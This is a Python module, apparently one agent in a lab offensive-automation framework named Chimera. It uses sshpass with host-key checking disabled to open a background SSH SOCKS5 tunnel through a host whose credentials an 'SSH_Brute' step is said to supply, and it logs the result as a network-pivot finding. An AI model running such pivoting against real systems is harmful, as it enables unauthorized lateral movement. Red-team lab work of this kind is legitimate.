from chimera_config import get_lab_password
import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import subprocess
import logging

# Ensure the agent can find the core directory for imports
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class SSH_Tunneler:
    def __init__(self):
        self.agent_id = "28"
        self.name = "SSH_Tunneler"
        self.db = ChimeraDB()
        
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(self.name)

    def create_dynamic_tunnel(self, target_ip, user, password, local_proxy_port=9050):
        """
        Creates a SOCKS proxy tunnel via SSH.
        -D: Dynamic port forwarding
        -f: Run in background
        -N: Do not execute remote command (just tunnel)
        """
        self.logger.info(f"Attempting to establish SOCKS tunnel via {target_ip}...")
        
        # We use sshpass for scripted password entry (install with: sudo apt install sshpass)
        cmd = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-D", str(local_proxy_port),
            "-f", "-N", f"{user}@{target_ip}"
        ]

        try:
            subprocess.run(cmd, check=True)
            self.logger.info(f"[!!!] TUNNEL ACTIVE: SOCKS5 Proxy at 127.0.0.1:{local_proxy_port}")
            self.db.report_finding(self.name, "Network_Pivot", {
                "pivot_host": target_ip,
                "proxy_type": "SOCKS5",
                "local_port": local_proxy_port
            })
            return True
        except Exception as e:
            self.logger.error(f"Failed to create tunnel: {e}")
            return False

    def run(self):
        self.db.heartbeat(self.name)
        # In a real scenario, the Commander would pass these from a successful SSH_Brute finding
        # Example placeholders:
        # self.create_dynamic_tunnel("10.10.10.5", "dan", get_lab_password())
        self.db.close()

if __name__ == "__main__":
    agent = SSH_Tunneler()
    agent.run()
